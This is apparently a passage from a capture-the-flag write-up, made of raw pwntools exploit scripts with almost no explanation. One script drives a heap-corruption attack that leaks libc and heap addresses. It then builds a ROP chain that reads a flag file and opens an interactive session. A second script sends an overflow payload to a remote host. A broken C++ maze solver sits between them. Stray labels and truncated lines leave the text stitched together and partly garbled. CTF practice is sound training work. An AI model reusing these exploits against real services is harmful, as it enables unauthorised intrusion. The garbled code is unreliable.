p.sendafter("say? ","aaaaa")
p.sendafter("kirin >> ",msg3)
p.sendafter("kirin >> ",msg2)
p.sendlineafter("size: ",str(0x28))
p.sendafter("say? ","b"*0x27)
#gdb.attach(p)
for i in range(6):
 p.sendafter("kirin >> ",msg3)
 p.sendafter("kirin >> ",msg2)
 p.sendlineafter("size: ",str(0xf8-i*0x10))
 p.sendafter("say? ",chr(0x61+i)*(0xf8-i*0x10-1))
p.sendafter("kirin >> ",msg3)
p.sendafter("kirin >> ",msg2)
p.sendlineafter("size: ",str(0x48))
p.sendafter("say? ","b"*0x47)
p.sendafter("kirin >> ",msg3)
p.sendafter("kirin >> ",msg2)
p.sendlineafter("size: ",str(0))
p.sendafter("say? ","b"*0x18+p64(0x541))
p.sendafter("kirin >> ",msg3)
p.sendafter("kirin >> ",msg2)
p.sendlineafter("size: ",str(0x28))
p.sendafter("say? ","b"*0x18)
p.sendafter("kirin >> ",msg3)
p.sendafter("kirin >> ",msg2)
p.sendlineafter("size: ",str(0x28))
p.sendafter("say? ","b")
p.recvuntil("leave: b")
s="\x00"+p.recv(5)
libc=u64(s.ljust(8,"\x00"))+0x7ffff77c5000-0x7ffff7bb1000
print hex(libc)
p.sendafter("kirin >> ",msg3)
p.sendafter("kirin >> ",msg2)
p.sendlineafter("size: ",str(0x28))
p.sendafter("say? ","b"*0x10)
p.recvuntil("b"*0x10)
s=p.recv(6)
heap=u64(s.ljust(8,"\x00"))
print hex(heap)
rop="./flag\x00\x00"+"a"*8+p64(heap-
0x55aee017a390+0x55aee017a400)+p64(libc+0x23e6a)+p64(0)+p64(libc+0x1b96)+p64(0
)+p64(libc+0x439c8)+p64(2)+p64(libc+0x11007F)
rop+=p64(libc+0x2155f)+p64(6)+p64(libc+0x23e6a)+p64(heap)+p64(libc+0x1b96)+p64
(0x40)+p64(libc+0x439c8)+p64(0)+p64(libc+0x11007F)
rop+=p64(libc+0x2155f)+p64(1)+p64(libc+0x23e6a)+p64(heap)+p64(libc+0x1b96)+p64
(0x40)+p64(libc+0x439c8)+p64(1)+p64(libc+0x11007F)
rop+=p64(libc+0x2155f)+p64(0)+p64(libc+0x23e6a)+p64(heap)+p64(libc+0x1b96)+p64
(0x40)+p64(libc+0x439c8)+p64(0)+p64(libc+0x11007F)
p.sendafter("kirin >> ",msg3)
p.sendafter("kirin >> ",msg2)
p.sendlineafter("size: ",str(0))
p.sendafter("say? 
","b"*0x18+p64(0x41)+p64(libc+0x3ed8e8)+p64(0)*6+p64(0x21)+p64(0)*3+p64(0x21)+
rop)
p.sendafter("kirin >> ",msg3)
p.sendafter("kirin >> ",msg2)
p.sendlineafter("size: ",str(0x28))
p.sendafter("say? ","b")
p.sendafter("kirin >> ",msg3)
p.sendafter("kirin >> ",msg2)
p.sendlineafter("size: ",str(0x28))
p2.close()
cfgo-CheckIn
upx
dfs
p2=remote("81.68.174.63",64681)
name="kirin"
p2.sendlineafter(": ","L")
p2.sendlineafter(": ",room)
p2.sendlineafter(": ",name)
data="a"*0xc0+p64(heap-0x55aee017a390+0x55aee017a410)+p64(libc+0x2155f)
msg2=msg("[RPC]\x00\x00\x00",3,0xd0,data)
p2.sendafter("kirin >> ",msg2)
p.recvuntil("say? ")
p.recvuntil("aaaa")
p.send(p64(libc+0x520A5))
p.interactive()
#include
#include
#include 
#include
#include
using namespace std;
// char map[] = "00000000111000100000+1*0000000000000";
char map[100000] = {0};
bool visit[100000];
int len;
int s_len;
void walk(int x, int y, string ans){
    if (visit[x + y * s_len])
        return;
    visit[x + y * s_len] = true;
    if(map[x + y * s_len] == '0'){
        return;
    }
    else if (map[x + y * s_len] == '*'){
        printf("%s\n", ans.c_str());
        printf("success!\n");
        exit(0);
    }
    if (x > 0)
.....
exp
        walk(x-1, y, ans+"a");
    if (x  0)
        walk(x, y-1, ans+"w");
    if (y ")
#coding=utf8
from pwn import *
import sys
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
local = 1
docker = 0
if len(sys.argv)>1:
  local = 0
  # pass
if local:
  if docker:
    # process_name = ''
    # cn = remote('',)
    # libc = ELF('',checksec=False)
    # bin = ELF('',checksec=False)
    pass
  else:
    cn = remote('0',9999)
    # libc = ELF('',checksec=False)
    # bin = ELF('',checksec=False)
    pass
  pass
else:
  cn = remote('111.73.46.229',51000)
  # libc = ELF('',checksec=False)
  # bin = ELF('',checksec=False)
  pass
def z(script =''):
  if not local: return
  if not docker: gdb.attach(cn,gdbscript=script)
  else: gdb.attach(target=process_name,gdbscript=script,exe=process_name)
  if script == '': input()
rv    = lambda x=0x1000 : cn.recv(x)
rl    = lambda   : cn.recvline()
ru    = lambda x : cn.recvuntil(x)
raddr   = lambda   : u64(cn.recvuntil('\n')[:-1].ljust(8,b'\x00'))
raddrn  = lambda x : u64(rv(x).ljust(8,b'\x00'))
sd    = lambda x : cn.send(x)
sl    = lambda x : cn.sendline(x)
sa    = lambda a,b : cn.sendafter(a,b)
sla   = lambda a,b : cn.sendlineafter(a,b)
interact= lambda   : cn.interactive()
ss    = lambda s : success(s) 
import inspect,re
def logsym(val):
  for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
    m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
  if m:
    varname =  m.group(1)
    ss(f"{varname} => {hex(val)}")
  else:
    ss(hex(val))
############################################
ru(" : ")
leak = int(rl()[:-2],16)
logsym(leak)
pay = flat('B'*50,p8(107),p8(leak&0xff))
sla('?',pay)
sla('?','y\r')
sa('!',flat(p8(1)))
rl()
rl()
interact()